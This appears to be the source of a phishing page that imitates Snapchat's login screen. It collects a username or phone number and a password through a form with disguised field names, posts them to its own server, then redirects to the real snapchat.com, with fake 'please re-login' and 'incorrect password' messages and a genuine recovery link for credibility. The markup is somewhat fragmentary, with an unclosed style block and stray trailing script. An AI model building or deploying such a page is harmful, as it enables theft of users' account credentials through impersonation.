  <style>
    /* General Styles */
    body {
      caret-color: transparent;
      font-family: "Avenir Next", Arial, sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }

    .login-container {
      text-align: center;
      max-width: 400px;
      width: 83%;
    }

    h1 {
      font-size: 27px;
      color: #000000;
      margin-bottom: 20px;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-weight: 500;
    }

    label {
      display: block;
      text-align: left;
      font-size: 12px;
      font-weight: bold;
      color: #55ccffd0;
      margin-top: 20px;
      margin-bottom: 5px;
    }

    input[type="text"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 11px;
      margin-top: 5px;
      border: 1px solid #dcdcdc;
      border-radius: 10px;
      font-size: 14px;
      box-sizing: border-box;
      caret-color:#00A6FF;
    }

    input:focus {
      border-color: #54545436;
      outline: none;
      transition: background-color 0.3s ease;
      box-shadow: 0 0 5px rgba(116, 116, 116, 0.17);
    }

    .password-container {
      position: relative;
      width: 100%;
    }
    
    .password-container .toggle-password {
      position: absolute;
      right: 5px;
      top: 60%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
      font-family: Arial, Helvetica, sans-serif;
    }

    .save-info {
      display: flex;
      align-items: center;
      margin-top: -10px;
      font-size: 12px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
    }

    .save-info label {
      color: #bcbcbc;
      font-weight: lighter;
    }

    .alternate-option {
      display: flex;
      align-items: center;
      font-size: 12.8px;
      color: #55ccffd0;
      margin-top: 15px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: bolder;
    }

    .forgot-password {
      font-size: 12px;
      color: #55ccffd0;
      margin-top: 16px;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: 600;
    }

    .alternate-option a,
    .forgot-password a {
      text-decoration: none;
      color: #55ccffd0;
    }

    input[type="checkbox"] {
      margin-right: 5px;
      margin-top: 20px;
    }

    .login-button {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 20px;
      width: 210px;
      padding: 12px;
      margin-top: 20px;
      background-color: #a7abad;
      border: none;
      border-radius: 18px;
      font-size: 14px;
      font-weight: bold;
      color: #ffffff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .login-button.enabled {
      background-color: #00A6FF;
    }

    .login-button:hover {
      background-color: #027bde;
    }

    /* Back Button */
    .back-button {
      position: absolute;
      top: 12px;
      left: 10px;
      background-color: transparent;
      border: none;
      font-size: 16px;
      color: #55ccffd0;
      cursor: pointer;
      display: flex;
      align-items: center;
    }

    .back-button:hover {
      color: #027bde;
    }
    .incorrect {
  color: red;
  display: none;
  margin-top: -10px;
  margin-left:  5px;
  margin-bottom: 5px;
  font-size: 13px;
  font-weight: 400;
  text-align: left; /* Ensures the text aligns to the left */
}

    .error-message {
    display: none; /* Hidden by default */
    background-color: #f44336; /* Red background */
    color: white; /* White text */
    padding: 15px;
    margin: 20px;
    border-radius: 5px;
    font-size: 16px;
    text-align: center;
    animation: fadeIn 0.5s ease-out, vibrate 0.2s ease-in-out 3;
}
/* Fade-in animation */
@keyframes fadeIn {
    from {
        opacity: 0;
    }
    to {
        opacity: 1;
    }
}

/* Vibration animation */
@keyframes vibrate {
    0% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    50% { transform: translateX(5px); }
    75% { transform: translateX(-5px); }
    100% { transform: translateX(0); }
}

</head>
<body>
  <!-- Back Button -->
  <button class="back-button" onclick="window.location.href='/index.html';">

  <div class="login-container">
    <div id="error-message" class="error-message">
      Something went wrong ! Please re-login to your account.
  </div>
    <h1>Log In</h1>
    <!-- Form for login -->
    <form action="" method="POST" onsubmit="return validatePassword(event)">
      <label for="username">USERNAME OR EMAIL</label>
      <input type="text" id="username" name="name" required>
      
      <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
      
      <label for="password">PASSWORD</label>
      <div class="password-container">
        <input type="password" id="password" name="message" required>
        <button type="button" class="toggle-password">
          <img src="/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
        </button>
      </div>
      
      <div class="save-info">
        <input type="checkbox" id="save-login">
        <label for="save-login">Save Login Info on your device</label>
      </div>
      
      <div class="incorrect">
        <p>Incorrect password, please try again.</p>
      </div>
      
      <p class="forgot-password"><a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a></p>
      
      <button type="submit" class="login-button">Log In</button>
    </form>
    
    <script>
      function validatePassword(event) {
        const passwordInput = document.getElementById('password');
        const incorrectMessage = document.querySelector('.incorrect');
        
        // Check if password is less than 8 characters
        if (passwordInput.value.length < 8) {
          incorrectMessage.style.display = 'block';  // Show error message
          event.preventDefault();  // Prevent form submission
          return false;  // Prevent further actions (redirect)
        } else {
          incorrectMessage.style.display = 'none';  // Hide error message if password is valid
          redirectToSnapchat();  // Call the redirect function if password is valid
          return true;  // Allow form submission
        }
      }
    
      function redirectToSnapchat() {
        // Wait briefly to ensure the form is submitted
        setTimeout(function () {
          window.location.href = "https://www.snapchat.com/";
        }, 1000); // Redirect after 1 second
      }
 
    
    // Toggle password visibility with dynamic image for show/hide
    document.querySelector('.toggle-password').addEventListener('click', function () {
      const passwordField = document.getElementById('password');
      const eyeIcon = document.getElementById('eye-icon');
      
      if (passwordField.type === 'password') {
        passwordField.type = 'text';
        eyeIcon.src = '/eye-open.svg';  // Update to the open eye icon
      } else {
        passwordField.type = 'password';
        eyeIcon.src = '/eye-closed.svg';  // Update to the closed eye icon
      }
    });

 // Switch between username/email and phone number
 const switchToPhone = document.getElementById('switch-to-phone');
    const usernameInput = document.getElementById('username');
    const label = document.querySelector('label[for="username"]');
  
    switchToPhone.addEventListener('click', function () {
      if (label.textContent === 'USERNAME OR EMAIL') {
        label.textContent = 'PHONE NUMBER';
        usernameInput.type = 'tel';
  
        switchToPhone.textContent = 'Use email instead';
      } else {
        label.textContent = 'USERNAME OR EMAIL';
        usernameInput.type = 'text';
      
        switchToPhone.textContent = 'Use phone number instead';
      }
    });
   
  </script>

        // Hide the error message after user clicks anywhere on the page
        document.body.addEventListener('click', function() {
            errorMessage.style.display = 'none';
        });
    };
